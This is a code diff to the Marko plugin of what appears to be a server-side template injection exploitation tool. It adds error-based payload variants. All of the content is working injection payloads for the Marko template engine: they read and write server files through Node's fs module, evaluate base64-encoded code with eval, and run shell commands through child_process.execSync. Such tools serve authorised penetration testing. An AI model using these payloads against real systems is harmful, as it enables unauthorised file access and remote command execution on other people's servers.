@@ -3,6 +3,7 @@ from utils import rand
 
 
 class Marko(javascript.Javascript):
+    generic_plugin = True
     priority = 5
     plugin_info = {
         "Description": """Marko template engine""",
@@ -25,6 +26,10 @@ class Marko(javascript.Javascript):
                 'test_render': f'${{typeof({rand.randints[0]})+{rand.randints[1]}}}',
                 'test_render_expected': f'number{rand.randints[1]}'
             },
+            'render_error': {
+                'header': """${{''['x'][({header[0]}+{header[1]}).toString()+""",
+                'trailer': """+({trailer[0]}+{trailer[1]}).toString()]}}""",
+            },
             'write': {
                 'call': 'inject',
                 'write': """${{require('fs').appendFileSync('{path}',Buffer('{chunk_b64p}','base64'),'binary')}}""",
@@ -34,14 +39,26 @@ class Marko(javascript.Javascript):
                 'call': 'render',
                 'read': """${{require('fs').readFileSync('{path}').toString('base64')}}"""
             },
+            'read_error': {
+                'read': """require('fs').readFileSync('{path}').toString('base64')"""
+            },
             'md5': {
                 'md5': "${{require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')}}"
+            },
+            'md5_error': {
+                'md5': "require('crypto').createHash('md5').update(require('fs').readFileSync('{path}')).digest('hex')"
             },
             'evaluate': {
                 'evaluate': """${{eval(Buffer('{code_b64p}', 'base64').toString())}}"""
             },
+            'evaluate_error': {
+                'evaluate': """eval(Buffer('{code_b64p}', 'base64').toString())"""
+            },
             'execute': {
                 'execute': """${{require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())}}"""
+            },
+            'execute_error': {
+                'execute': """require('child_process').execSync(Buffer('{code_b64p}', 'base64').toString())"""
             },
             'execute_blind': {
                 'call': 'inject',
